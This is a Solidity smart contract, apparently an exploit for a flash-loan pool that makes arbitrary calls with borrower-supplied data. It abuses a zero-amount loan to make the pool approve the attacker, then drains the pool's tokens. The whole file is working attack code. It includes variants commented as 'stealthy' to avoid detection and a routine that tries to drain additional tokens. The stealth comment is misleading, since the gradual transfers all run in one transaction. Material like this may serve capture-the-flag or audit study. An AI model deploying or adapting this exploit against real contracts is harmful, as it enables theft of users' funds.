// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

interface IPool {
    function requestFlashLoan(uint256 amount, address borrower, address target, bytes calldata data) external;
}

contract AttackPool {
    IPool private pool;
    IERC20 private token;
    address immutable attacker;

    constructor(address _poolAddress, address _tokenAddress) {
        pool = IPool(_poolAddress);
        token = IERC20(_tokenAddress);
        attacker = msg.sender;
    }

    function attack() external {
        require(msg.sender == attacker, "Only attacker can call this");
        // Craft the data to call approve on the token contract
        bytes memory data = abi.encodeWithSignature("approve(address,uint256)", address(this), type(uint256).max);

        // Request a flash loan of 0 tokens, but execute the approve call during the loan
        pool.requestFlashLoan(0, address(this), address(token), data);

        // Now that we have approval, transfer all tokens from the pool to the attacker
        uint256 poolBalance = token.balanceOf(address(pool));
        token.transferFrom(address(pool), attacker, poolBalance);
    }

    // Alternative: More stealthy approach - approve ourselves gradually
    function stealthyHijack() external {
        require(msg.sender == attacker, "Only attacker can call this");

        // Approve the exploiter contract instead of EOA
        bytes memory data = abi.encodeWithSignature("approve(address,uint256)", address(this), type(uint256).max);

        pool.requestFlashLoan(0, attacker, address(token), data);

        // Transfer out gradually to avoid detection
        uint256 poolBalance = token.balanceOf(address(pool));
        uint256 stealAmount = poolBalance / 10; // Steal 10% at a time

        for (uint256 i = 0; i < 10; i++) {
            if (token.balanceOf(address(pool)) >= stealAmount) {
                token.transferFrom(address(pool), attacker, stealAmount);
            }
        }
    }

    // Even more advanced: Re-enter and drain multiple tokens
    function advancedHijack(address[] memory additionalTokens) external {
        require(msg.sender == attacker, "Only attacker can call this");

        // Hijack the main token
        bytes memory data = abi.encodeWithSignature("approve(address,uint256)", address(this), type(uint256).max);

        pool.requestFlashLoan(0, attacker, address(token), data);

        // Drain main token
        uint256 mainBalance = token.balanceOf(address(pool));
        token.transferFrom(address(pool), attacker, mainBalance);

        // If pool holds other tokens, we can try to hijack them too
        for (uint256 i = 0; i < additionalTokens.length; i++) {
            try this.hijackToken(additionalTokens[i]) {}
            catch {
                // Continue with next token if one fails
                continue;
            }
        }
    }

    function hijackToken(address tokenAddress) external {
        IERC20 otherToken = IERC20(tokenAddress);

        // Try to get approval for this token too
        bytes memory data = abi.encodeWithSignature("approve(address,uint256)", address(this), type(uint256).max);

        // This might fail if the pool doesn't have this token, but we try anyway
        (bool success,) = address(pool).call(
            abi.encodeWithSignature("requestFlashLoan(uint256,address,address,bytes)", 0, attacker, tokenAddress, data)
        );

        if (success) {
            // Drain this token too
            uint256 balance = otherToken.balanceOf(address(pool));
            if (balance > 0) {
                otherToken.transferFrom(address(pool), attacker, balance);
            }
        }
    }
}
